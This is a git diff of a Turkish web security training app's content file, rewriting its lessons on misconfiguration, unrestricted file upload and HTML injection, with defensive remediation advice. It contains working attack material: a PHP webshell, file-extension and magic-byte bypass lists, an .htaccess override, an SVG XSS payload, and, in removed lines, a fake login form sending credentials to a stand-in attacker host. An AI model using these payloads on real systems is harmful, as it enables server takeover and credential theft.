+                  <h4 style="font-size:13px; color:var(--secondary); margin:0 0 6px 0;">Güvenlik Çizgisi (Trust Boundary) Kırılması</h4>
+                  <p class="small" style="margin:0; line-height:1.6;">
+                    Misconfiguration nadiren tek başına durur; genellikle <b>zafiyet zincirlerinin (exploit chaining)</b> katalizörüdür. Örneğin bir CORS hatası tek başına yalnızca bilgi sızdırırken, zayıf cookie ayarları ve açık bir API ile birleştiğinde doğrudan Account Takeover'a dönüşür.
+                  </p>
+                </div>
+              </div>
+
+              <h4 style="font-size:14px; color:#cbd5e1; margin:16px 0 8px 0;">Katman Bazlı Saldırı Yüzeyi (Misconfiguration Taxonomy)</h4>
+              <div style="overflow-x:auto; margin-bottom:14px;">
+                <table style="width:100%; border-collapse:collapse; font-size:13px; color:var(--muted); background:rgba(255,255,255,0.02); border-radius:8px; overflow:hidden;">
+                  <thead>
+                    <tr style="border-bottom:1px solid var(--glass);">
+                      <th style="text-align:left; padding:8px; color:#cbd5e1;">Katman</th>
+                      <th style="text-align:left; padding:8px; color:var(--accent);">Kritik Zayıflık Örnekleri</th>
+                      <th style="text-align:left; padding:8px; color:var(--secondary);">Güvenlik Etkisi</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                      <td style="padding:8px; color:#cbd5e1;"><b>Web Sunucu & OS</b></td>
+                      <td style="padding:8px;"><code>/.git</code>, <code>/.env</code>, yedek dosyaları (<code>.bak</code>), açık dizin listeleme (Directory Listing), gereksiz HTTP fiilleri (<code>PUT</code>, <code>DELETE</code>).</td>
+                      <td style="padding:8px;">Kaynak kod/anahtar ifşası, yetkisiz dosya yazma ile RCE.</td>
+                    </tr>
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                      <td style="padding:8px; color:#cbd5e1;"><b>Uygulama & API</b></td>
+                      <td style="padding:8px;">Açık debug/verbose hata sayfaları (Stack Trace), Spring Boot Actuators, açık GraphQL Introspection, Mass Assignment filtre eksikliği.</td>
+                      <td style="padding:8px;">Altyapı haritalama, dahili API rotalarının sızdırılması, dikey yetki yükseltme.</td>
+                    </tr>
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                      <td style="padding:8px; color:#cbd5e1;"><b>Protokol & Başlıklar</b></td>
+                      <td style="padding:8px;">Zayıf CORS politikaları (<code>Origin: *</code> + Credentials), eksik çerez bayrakları (<code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>), eksik CSP/HSTS.</td>
+                      <td style="padding:8px;">XSS etkisinin büyümesi, CSRF kalkanının düşmesi, Clickjacking ve veri hırsızlığı.</td>
+                    </tr>
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                      <td style="padding:8px; color:#cbd5e1;"><b>Bulut & Depolama</b></td>
+                      <td style="padding:8px;">Public AWS S3 / Azure Blob kovaları, zayıf IAM kuralları, boşa çıkan CNAME yönlendirmeleri (Subdomain Takeover).</td>
+                      <td style="padding:8px;">Toplu veri tabanı sızıntısı, domain itibar kaybı, kötü amaçlı betik enjeksiyonu.</td>
+                    </tr>
+                    <tr>
+                      <td style="padding:8px; color:#cbd5e1;"><b>Kimlik & Erişim</b></td>
+                      <td style="padding:8px;">Varsayılan parolalar (<code>admin:admin</code>), JWT <code>"alg": "none"</code> kabulü, limit konulmamış (Rate Limit) giriş rotaları.</td>
+                      <td style="padding:8px;">Brute-force zafiyeti, oturum imza denetiminin çökmesi, hesap devralma.</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+
+              <div class="card" style="border-left:2px solid #34d399; background:rgba(52,211,153,0.04); margin-top:12px;">
+                <strong style="color:#34d399; font-size:13px; display:block; margin-bottom:4px;">🛡️ Savunma ve Hardening Standardı</strong>
+                <ul class="small" style="margin:0; padding-left:18px; line-height:1.7;">
+                  <li><b>Hardening Checklist & Baseline:</b> CIS Benchmarks standartlarına uygun sistem sıkılaştırması uygulanmalıdır.</li>
+                  <li><b>Disable Unneeded Features:</b> Kullanılmayan tüm HTTP metotları, portlar, örnek sayfalar, test hesapları ve modüller kapatılmalıdır.</li>
+                  <li><b>Error Sanitization:</b> Kullanıcıya yalnızca jenerik hata kodları gösterilmeli; stack trace ve mimari detaylar log sunucularında izole tutulmalıdır.</li>
+                  <li><b>Automated Security Audits:</b> CI/CD süreçlerine açık bucket, zayıf header ve sızan secret taraması yapan statik/dinamik denetleyiciler entegre edilmelidir.</li>
+                </ul>
+              </div>
+            `
           },
           {
             "title": "Örnek Misconfiguration Senaryoları",
@@ -9524,36 +9742,202 @@ Content-Type: application/json
         ]
       },
 
-      unrestricted_file_upload: {
-        menuName: 'RCE / File Upload',
+file_upload: {
+        menuName: 'File Upload',
         icon: 'icon-exploitation',
         parent: 'vulnerabilities',
-        title: 'RCE - Remote Code Execution (Uzaktan Kod Çalıştırma)',
-        description: 'Komut enjeksiyonu, dosya yükleme veya zincirleme zafiyetler yoluyla hedef sistemde kod çalıştırma teknikleri.',
+        title: 'Unrestricted File Upload (Güvensiz Dosya Yükleme)',
+        description: 'Dosya uzantısı, MIME türü ve içerik doğrulamalarının yetersizliği sonucu oluşan yetkisiz dosya barındırma, sunucu taraflı kod yürütme (RCE) ve Stored XSS zafiyetleri.',
         sections: [
           {
-            title: 'Özet Bilgi ve Kritik Etki',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Hedef: Sunucuda komut çalıştırma yeteneği sağlayan bir Webshell (PHP, ASP, JSP, Python) yüklemek.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Adım:</strong> Yükleme Formu → Bypass Tekniği Uygula → Yüklenen Dosyaya Erişim Sağla → RCE.</li>
-            </ul>`
+            title: '1. Zafiyetin Anatomisi ve Risk Katmanları',
+            content: `
+              <p class="small" style="margin-bottom:14px; line-height:1.7;">
+                <b>Unrestricted File Upload (CWE-434):</b> Web uygulamalarının kullanıcılardan dosya kabul ettiği alanlarda (profil fotoğrafı, CV, fatura, veri import vb.), yüklenen dosyanın adını, uzantısını, boyutunu ve gerçek ikili (binary) içeriğini yeterince doğrulamaması durumudur.
+              </p>
+              <div class="tool-io-grid" style="margin-bottom:14px;">
+                <div class="card" style="margin-bottom:0; border: 1px solid rgba(139,92,246,0.3);">
+                  <h4 style="font-size:13px; color:var(--accent); margin:0 0 6px 0;">Sunucu Taraflı Yürütme (RCE)</h4>
+                  <p class="small" style="margin:0; line-height:1.6;">Yüklenen betik dosyasının (<code>.php</code>, <code>.aspx</code>, <code>.jsp</code>) web kök dizini altında saklanması ve doğrudan sunucu yorumlayıcısı tarafından çalıştırılmasıdır. Sistem üzerinde tam yetkisiz kontrol sağlar.</p>
+                </div>
+                <div class="card" style="margin-bottom:0; border: 1px solid rgba(6,182,212,0.3);">
+                  <h4 style="font-size:13px; color:var(--secondary); margin:0 0 6px 0;">İstemci Taraflı Riskler (Stored XSS)</h4>
+                  <p class="small" style="margin:0; line-height:1.6;">SVG, HTML veya XML gibi dosyaların filtrelenmeden yüklenip doğrudan hedef domain altından servis edilmesidir. Dosya açıldığında kurbanın oturumunda JavaScript çalıştırılır.</p>
+                </div>
+              </div>
+            `
           },
           {
-            title: 'Bypass Teknikleri',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>1. Client-Side Bypass:</strong> Eğer tarayıcıda sadece JS ile uzantı kontrolü yapılıyorsa, JS'yi devredışı bırak veya Burp ile isteği yakalayıp uzantıyı manuel değiştir.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>2. Mime Type Kontrolü Atlatma:</strong> Yüklenen dosya <code>shell.jpg</code> olsa bile, Burp ile <code>Content-Type: image/jpeg</code>'i <code>Content-Type: application/x-php</code> olarak değiştirin.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>3. Uzantı Blacklist Bypass:</strong> <code>.php</code> engelleniyorsa: <code>.phtml</code>, <code>.php5</code>, <code>.php3</code>, <code>.phps</code> (Sunucunun kabul ettiği diğer PHP uzantıları) veya <code>.asp</code>, <code>.jsp</code> deneyin.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>4. Double Uzantı/Null Byte:</strong> Filtreleme sonrası dosya adına <code>.jpg</code> ekleniyorsa: <code>shell.php.jpg</code> veya <code>shell.php%00.jpg</code> (Null byte, dosya adı kısıtlamasını atlatabilir).</li>
-            </ul>`
+            title: '2. Doğrulama Katmanları ve İstek Anatomisi',
+            content: `
+              <p class="small" style="line-height:1.6; margin-bottom:10px;">
+                Burp Suite ile yakalanan tipik bir <code>multipart/form-data</code> yükleme isteğinde, sunucunun filtreleme mantığını çözmek için incelenen temel alanlar:
+              </p>
+              <pre style="margin:0 0 12px 0;"><code>POST /api/upload HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
+
+------WebKitFormBoundaryXYZ
+Content-Disposition: form-data; name="file"; filename="avatar.jpg"
+Content-Type: image/jpeg
+
+[DOSYA İÇERİĞİ / MAGIC BYTES]
+------WebKitFormBoundaryXYZ--</code></pre>
+              <div style="overflow-x:auto;">
+                <table style="width:100%; border-collapse:collapse; font-size:13px; color:var(--muted); background:rgba(255,255,255,0.02); border-radius:8px; overflow:hidden;">
+                  <thead>
+                    <tr style="border-bottom:1px solid var(--glass);">
+                      <th style="text-align:left; padding:8px; color:#cbd5e1;">Denetim Noktası</th>
+                      <th style="text-align:left; padding:8px; color:var(--accent);">İncelenen Değer</th>
+                      <th style="text-align:left; padding:8px; color:var(--secondary);">Zayıflık Nedeni</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                      <td style="padding:8px; color:#cbd5e1;"><b>Client-Side</b></td>
+                      <td style="padding:8px;">HTML <code>accept</code> / JS regex</td>
+                      <td style="padding:8px;">İstemci tarafında çalışır; proxy ile istek yakalanıp anında manipüle edilebilir.</td>
+                    </tr>
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                      <td style="padding:8px; color:#cbd5e1;"><b>MIME Type</b></td>
+                      <td style="padding:8px;"><code>Content-Type: image/jpeg</code></td>
+                      <td style="padding:8px;">İstemci başlığıdır; dosyanın gerçek içeriğiyle örtüşmek zorunda değildir.</td>
+                    </tr>
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                      <td style="padding:8px; color:#cbd5e1;"><b>Blacklist Uzantı</b></td>
+                      <td style="padding:8px;"><code>filename="shell.php"</code></td>
+                      <td style="padding:8px;">Sadece bilinen uzantıları yasaklar; alternatif ve ikincil betik uzantıları unutulabilir.</td>
+                    </tr>
+                    <tr>
+                      <td style="padding:8px; color:#cbd5e1;"><b>Magic Bytes</b></td>
+                      <td style="padding:8px;">İlk baytlar (Hex imzası)</td>
+                      <td style="padding:8px;">Görsel başlığının altına zararlı kod gömülerek (Polyglot) kontrol atlatılabilir.</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            `
           },
           {
-            title: 'PoC Örnekleri (RCE Zinciri)',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Basit Shell:</strong> <code>&lt;?php system($_GET['cmd']); ?&gt;</code> (Komut Çalıştırma)</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Shell Yükleme Adımı (Burp):</strong> <code>filename="shell.php"</code> ve <code>Content-Type: image/jpeg</code>'i <code>application/x-php</code> olarak değiştir.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Exploit:</strong> <code>https://target.com/uploads/shell.php?cmd=ls%20-la</code></li>
-            </ul>`
+            title: '3. Baypas Yöntemleri & Test Metodolojisi',
+            content: `
+              <div style="display:grid; gap:10px;">
+                <details class="accordion-menu" style="border:1px solid rgba(255,255,255,0.05); border-radius:8px; padding:6px; background:rgba(255,255,255,0.01);">
+                  <summary style="cursor:pointer; font-weight:bold; color:#cbd5e1; padding:6px;">1. Client-Side & MIME Type Manipülasyonu</summary>
+                  <div class="card" style="margin:8px 0 0 0; border-left:2px solid var(--accent);">
+                    <p class="small" style="margin:0 0 6px 0;">Tarayıcıdaki JavaScript kontrolü aşıldıktan sonra, sunucunun yalnızca <code>Content-Type</code> başlığına güvenip güvenmediği test edilir:</p>
+                    <pre style="margin:0; font-size:12px; color:#d6f4ff;">Content-Disposition: form-data; name="file"; filename="exploit.php"
+Content-Type: image/jpeg</pre>
+                  </div>
+                </details>
+
+                <details class="accordion-menu" style="border:1px solid rgba(255,255,255,0.05); border-radius:8px; padding:6px; background:rgba(255,255,255,0.01);">
+                  <summary style="cursor:pointer; font-weight:bold; color:#cbd5e1; padding:6px;">2. Kara Liste (Blacklist) Alternatif Uzantı Denemeleri</summary>
+                  <div class="card" style="margin:8px 0 0 0; border-left:2px solid var(--secondary);">
+                    <p class="small" style="margin:0 0 6px 0;">Sunucu temel uzantıyı (<code>.php</code>, <code>.asp</code>, <code>.jsp</code>) engelliyorsa, web sunucusunun çalıştırabildiği diğer uzantılar taranır:</p>
+                    <pre style="margin:0; font-size:12px; color:#d6f4ff;">PHP:   .phtml, .php3, .php4, .php5, .php7, .phps, .pht, .phar
+ASP:   .aspx, .cer, .asa, .asax, .ashx
+JSP:   .jspx, .jsw, .jsv, .jspf, .war
+Büyük/Küçük Harf: .pHp, .pHTML, .AsPx, .Jsp</pre>
+                  </div>
+                </details>
+
+                <details class="accordion-menu" style="border:1px solid rgba(255,255,255,0.05); border-radius:8px; padding:6px; background:rgba(255,255,255,0.01);">
+                  <summary style="cursor:pointer; font-weight:bold; color:#cbd5e1; padding:6px;">3. Çift Uzantı ve Dosya Adı Normalizasyon Hileleri</summary>
+                  <div class="card" style="margin:8px 0 0 0; border-left:2px solid #facc15;">
+                    <p class="small" style="margin:0 0 6px 0;">Sunucunun dosya adını temizleme mantığındaki eksiklikler hedeflenir:</p>
+                    <pre style="margin:0; font-size:12px; color:#d6f4ff;">Çift Uzantı:         exploit.php.jpg (Apache mime.types hatalarında çalışabilir)
+Non-Recursive Strip: exploit.p.phphp (Sunucu 'php' kelimesini tek sefer sildiğinde .php kalır)
+Trailing Dot/Space:  exploit.php.  veya  exploit.php%20 (Windows dosya sisteminde nokta/boşluk atılır)
+Null Byte (Eski):    exploit.php%00.jpg (Dize sonlandırma karakteri)</pre>
+                  </div>
+                </details>
+
+                <details class="accordion-menu" style="border:1px solid rgba(255,255,255,0.05); border-radius:8px; padding:6px; background:rgba(255,255,255,0.01);">
+                  <summary style="cursor:pointer; font-weight:bold; color:#cbd5e1; padding:6px;">4. Magic Bytes (Dosya İmzası) & Polyglot Yükleme</summary>
+                  <div class="card" style="margin:8px 0 0 0; border-left:2px solid #4ade80;">
+                    <p class="small" style="margin:0 0 6px 0;">Sunucu dosyanın ilk baytlarını doğrulamak için Magic Bytes denetimi yapıyorsa, betiğin başına meşru görsel imzası eklenir:</p>
+                    <pre style="margin:0; font-size:12px; color:#00ff88;">GIF89a;
+&lt;?php system($_GET['cmd']); ?&gt;</pre>
+                    <p class="small" style="margin:6px 0 0 0; color:var(--muted);">JPEG için <code>FF D8 FF</code> veya PNG için <code>89 50 4E 47</code> başlığı bozulmadan EXIF metadata yorum alanına da kod gömülebilir (ExifTool ile).</p>
+                  </div>
+                </details>
+
+                <details class="accordion-menu" style="border:1px solid rgba(255,255,255,0.05); border-radius:8px; padding:6px; background:rgba(255,255,255,0.01);">
+                  <summary style="cursor:pointer; font-weight:bold; color:#cbd5e1; padding:6px;">5. Sunucu Yapılandırma Ezme (.htaccess / web.config)</summary>
+                  <div class="card" style="margin:8px 0 0 0; border-left:2px solid #ef4444;">
+                    <p class="small" style="margin:0 0 6px 0;">Betik uzantıları engellenmiş ancak dosya adı kısıtlaması yoksa, dizin bazlı çalışma kuralları manipüle edilir:</p>
+                    <pre style="margin:0; font-size:12px; color:#d6f4ff;"># 1. Adım: .htaccess dosyası yükle
+AddType application/x-httpd-php .customext
+
+# 2. Adım: exploit.customext yükle
+&lt;?php system($_GET['cmd']); ?&gt;</pre>
+                  </div>
+                </details>
+              </div>
+            `
+          },
+          {
+            title: '4. Sömürü Zincirleri (Stored XSS & RCE)',
+            content: `
+              <div class="tool-io-grid">
+                <div class="card" style="margin:0; border: 1px solid var(--border);">
+                  <h4 style="font-size:13px; color:#cbd5e1;">A) SVG ile Stored XSS</h4>
+                  <p class="small" style="margin:0 0 6px 0;">Görsel kabul eden uç noktalara SVG yüklenip ana etki alanında doğrudan açıldığında:</p>
+                  <pre style="margin:0; font-size:11px; color:#00ff88;">&lt;?xml version="1.0" standalone="no"?&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;/svg&gt;</pre>
+                </div>
+                <div class="card" style="margin:0; border: 1px solid var(--border);">
+                  <h4 style="font-size:13px; color:#cbd5e1;">B) Webshell ile RCE</h4>
+                  <p class="small" style="margin:0 0 6px 0;">Yüklenen betik web üzerinden erişilebilir bir dizindeyse ve çalıştırma izni varsa:</p>
+                  <pre style="margin:0; font-size:11px; color:#00ff88;">GET /uploads/avatar_123.php?cmd=id HTTP/1.1
+Host: target.com
+
+HTTP/1.1 200 OK
+uid=33(www-data) gid=33(www-data)</pre>
+                </div>
+              </div>
+            `
+          },
+          {
+            title: '5. Sık Karşılaşılan Yanılgılar (False Positives)',
+            content: `
+              <ul style="list-style:none; padding:0; margin:0; display:grid; gap:8px;">
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:13px;">
+                  <b>Dosyanın Yüklenmesi &ne; RCE:</b> Dosyanın sunucuya başarıyla kaydedilmesi tek başına açık demek değildir. Web sunucusu ilgili dizinde çalıştırma yetkisini (execution) kapatmışsa dosya yalnızca düz metin olarak indirilir.
+                </li>
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:13px;">
+                  <b>MIME Tipinin Kabulü &ne; Bypass:</b> Proxy ile <code>Content-Type: image/jpeg</code> gönderildiğinde yanıtın 200 dönmesi, sunucunun dosya içeriğini veya uzantısını arka planda reddetmediği anlamına gelmez.
+                </li>
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:13px;">
+                  <b>İzole Cloud Storage Kalkanı:</b> Dosyalar AWS S3, Google Cloud Storage veya harici bir statik domainde (<code>target-cdn.com</code>) saklanıyorsa, sunucu tarafında kod çalıştırılamaz ve origin farkı nedeniyle XSS etkisi izole kalır.
+                </li>
+              </ul>
+            `
+          },
+          {
+            title: '6. Savunma Standartları ve Doğru Yapılandırma (Remediation)',
+            content: `
+              <ul style="list-style:none; padding:0; margin:0; display:grid; gap:10px;">
+                <li style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <strong style="color:#4ade80;">1. Sıkı İzin Listesi (Allowlist):</strong> Kara liste yerine yalnızca uygulamanın ihtiyaç duyduğu güvenli uzantılar (<code>.jpg</code>, <code>.png</code>, <code>.pdf</code>) kabul edilmelidir.
+                </li>
+                <li style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <strong style="color:#4ade80;">2. Dosya Adını Rastgele Üretme (Re-naming):</strong> Kullanıcının gönderdiği dosya adı doğrudan kullanılmamalı; sunucu tarafında rastgele bir hash/UUID üretilerek uzantı güvenli listeyle eklenmelidir.
+                </li>
+                <li style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <strong style="color:#4ade80;">3. Web Kök Dizini Dışında Saklama:</strong> Yüklenen dosyalar doğrudan web üzerinden erişilebilen dizinlerin (web root) dışında depolanmalı veya izole bir CDN/bucket üzerinde barındırılmalıdır.
+                </li>
+                <li style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <strong style="color:#4ade80;">4. Çalıştırma İznini Kaldırma (No-Exec):</strong> Web sunucusu yapılandırmasında yükleme dizinleri için betik yürütme özellikleri (execution) tamamen kapatılmalıdır.
+                </li>
+                <li style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <strong style="color:#4ade80;">5. İndirmeye Zorlama Başlıkları:</strong> Servis edilirken <code>X-Content-Type-Options: nosniff</code> ve tarayıcının dosyayı doğrudan render etmesini önleyen <code>Content-Disposition: attachment</code> başlıkları zorunlu kılınmalıdır.
+                </li>
+              </ul>
+            `
           }
         ]
       },
@@ -9809,112 +10193,539 @@ session_hijacking: {
 },
       html_injection: {
         menuName: 'HTML Injection',
-        icon: 'icon-refresh',
+        icon: 'icon-code',
         parent: 'vulnerabilities',
-        title: 'HTML Injection (UI Redressing)',
-        description: 'Uygulamanın kullanıcıdan gelen girdiyi filtrelemeden sayfaya yansıtması sonucu arayüz manipülasyonu.',
+        title: 'HTML Injection (Content Spoofing & UI Manipulation)',
+        description: 'Kullanıcı girdisinin doğrulanmadan HTML dokümanına basılması sonucu sayfa arayüzünün, formların veya bağlantıların manipüle edilmesi zafiyeti.',
         sections: [
           {
-            title: 'Tanım ve Kapsam',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong>Tanım:</strong> Uygulama, kullanıcının girdisine izin veriyor ancak &lt;script&gt; etiketleri gibi tehlikeli JavaScript kodlarını filtrelerken, diğer HTML etiketlerini (&lt;p&gt;, &lt;a&gt;, &lt;img&gt;, &lt;form&gt;) engellemeyi unutuyor.
-                </li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong>Kapsam:</strong> Reflected (Yansıyan) ve Stored (Kalıcı) XSS'in arandığı tüm input alanları (arama kutuları, yorum formları, kullanıcı profili adları).
-                </li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong>Kritik Etki:</strong> Sayfa içeriğini bozma (Defacement), Oturum Kimlik Avı (Phishing) ve Kullanıcı Arayüzü Manipülasyonu (UI Redressing).
-                </li>
-            </ul>`
+            title: '1. Tanım ve XSS ile Arasındaki Temel Fark',
+            content: `
+              <p style="color:var(--muted);font-size:14px;margin-bottom:12px;">
+                <b>HTML Injection:</b> Uygulamanın, kullanıcıdan aldığı metinlerdeki HTML etiketlerini (&lt;b&gt;, &lt;a&gt;, &lt;form&gt;, &lt;img&gt;) temizlemeden (encode etmeden) sayfaya yansıtmasıdır.
+              </p>
+              <div class="tool-io-grid">
+                <div class="card" style="margin-bottom:0; border: 1px solid var(--border);">
+                  <h4 style="font-size:13px; color:#cbd5e1;">XSS (Cross-Site Scripting)</h4>
+                  <p class="small" style="margin:0 0 6px 0;">JavaScript kodunu tarayıcı bağlamında çalıştırmayı hedefler.</p>
+                  <p class="small" style="margin:0; color:var(--muted);"><b>Sonuç:</b> Çerez hırsızlığı (Session Hijacking), DOM manipülasyonu, yetkisiz arka plan API istekleri.</p>
+                </div>
+                <div class="card" style="margin-bottom:0; border: 1px solid var(--border);">
+                  <h4 style="font-size:13px; color:#cbd5e1;">HTML Injection</h4>
+                  <p class="small" style="margin:0 0 6px 0;">JavaScript çalıştırılamaz veya filtrelenmiştir; ancak HTML etiketleri render edilir.</p>
+                  <p class="small" style="margin:0; color:var(--muted);"><b>Sonuç:</b> Arayüz manipülasyonu (UI Redressing), sahte giriş formları (Phishing), içerik tahrifatı (Defacement).</p>
+                </div>
+              </div>
+            `
           },
           {
-            title: 'Tespit ve Fingerprinting',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong>Hızlı Test:</strong> Girdi alanına basit bir HTML etiketi (örneğin kalın yazı) enjekte edin ve yansımasını kontrol edin.
-                    <pre>Girdi: &lt;b&gt;TEST&lt;/b&gt;</pre>
-                    <pre>Beklenen Çıktı (Zafiyet varsa): <b>TEST</b> (Kalın Yazı)</pre>
-                </li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong>XSS Farkı:</strong> Eğer &lt;script&gt;alert(1)&lt;/script&gt; çalışmıyorsa (filtreliyorsa) ancak &lt;b&gt; veya &lt;a&gt; çalışıyorsa, bu bir HTML Injection zafiyetidir.
-                </li>
-            </ul>`
+            title: '2. Türleri: Reflected vs. Stored',
+            content: `
+              <div style="display:grid; grid-template-columns: repeat(2, 1fr); gap:12px; font-size:13px;">
+                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid var(--accent);">
+                  <strong style="color:#cbd5e1; display:block; margin-bottom:4px;">Reflected (Yansıyan)</strong>
+                  <p class="small" style="margin:0 0 6px 0;">Girdi anlık olarak URL parametrelerinden veya arama sorgularından sayfaya yansır.</p>
+                  <span style="color:var(--muted); font-size:11px;">Kurbanın özel hazırlanmış bağlantıya tıklaması gerekir.</span>
+                </div>
+                <div style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; border-left:3px solid var(--accent);">
+                  <strong style="color:#cbd5e1; display:block; margin-bottom:4px;">Stored (Kalıcı)</strong>
+                  <p class="small" style="margin:0 0 6px 0;">Zararlı etiketler veritabanına, yorumlara veya kullanıcı profiline kaydedilir.</p>
+                  <span style="color:var(--muted); font-size:11px;">Sayfayı açan tüm ziyaretçiler doğrudan etkilenir.</span>
+                </div>
+              </div>
+            `
           },
           {
-            title: 'PoC Örnekleri (Phishing ve Manipülasyon)',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong>Görüntüleme Manipülasyonu (Image Phishing):</strong> Resmi değiştirerek kullanıcıyı yanıltma.
-                    <pre>&lt;img src="https://hacker.com/login_button.png"&gt;</pre>
+            title: '3. Tespit ve Bağlam (Context) Analizi',
+            content: `
+              <p class="small" style="margin-bottom:10px;">Girdinin HTML içinde nereye düştüğünü tespit etmek için kullanılan adımlar:</p>
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:10px">
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">1. Metin Düğümü Bağlamı (Text Node):</strong>
+                  <p class="small" style="margin:0 0 4px 0;">Girdi etiketler arasına düşüyorsa (&lt;p&gt;GIRDI&lt;/p&gt;) temel etiketlerle test edilir:</p>
+                  <pre style="background:rgba(0,0,0,0.3);padding:6px;border-radius:4px;margin:0;color:#d6f4ff;font-family:monospace;font-size:12px;">&lt;h1&gt;TEST&lt;/h1&gt;  veya  &lt;u&gt;TEST&lt;/u&gt;</pre>
                 </li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong>Kalıcı (Stored) Phishing Senaryosu:</strong> Bir yorum alanına sahte login formu enjekte etme.
-                    <pre>
-&lt;form action="https://hacker.com/steal" method="POST"&gt;
-    &lt;h3&gt;Oturumunuzun Süresi Doldu&lt;/h3&gt;
-    Kullanıcı Adı: &lt;input type="text" name="user"&gt;
-    Şifre: &lt;input type="password" name="pass"&gt;
-    &lt;input type="submit" value="Giriş Yap"&gt;
-&lt;/form&gt;</pre>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">2. Öznitelik Bağlamı (Attribute Context):</strong>
+                  <p class="small" style="margin:0 0 4px 0;">Girdi bir parametreye yazılıyorsa (&lt;input value="GIRDI"&gt;) tırnak kapatılarak dışarı çıkılır:</p>
+                  <pre style="background:rgba(0,0,0,0.3);padding:6px;border-radius:4px;margin:0;color:#d6f4ff;font-family:monospace;font-size:12px;">"&gt;&lt;h1&gt;TEST&lt;/h1&gt;</pre>
                 </li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
-                    <strong>Bağlantı Manipülasyonu:</strong> Kullanıcının tıklaması gereken bir linki, kötü amaçlı bir adrese yönlendirme.
-                    <pre>&lt;a href="https://hacker.com/redirect"&gt;ÜCRETSİZ ÖDÜL KAZAN!&lt;/a&gt;</pre>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">3. Kara Liste (Blacklist) Anomalileri:</strong>
+                  <p class="small" style="margin:0;">Uygulama yalnızca &lt;script&gt; kelimesini siliyor ancak &lt;form&gt;, &lt;input&gt;, &lt;a&gt; gibi etiketleri kabul ediyorsa HTML Injection doğrulanmış olur.</p>
                 </li>
-            </ul>`
+              </ul>
+            `
+          },
+          {
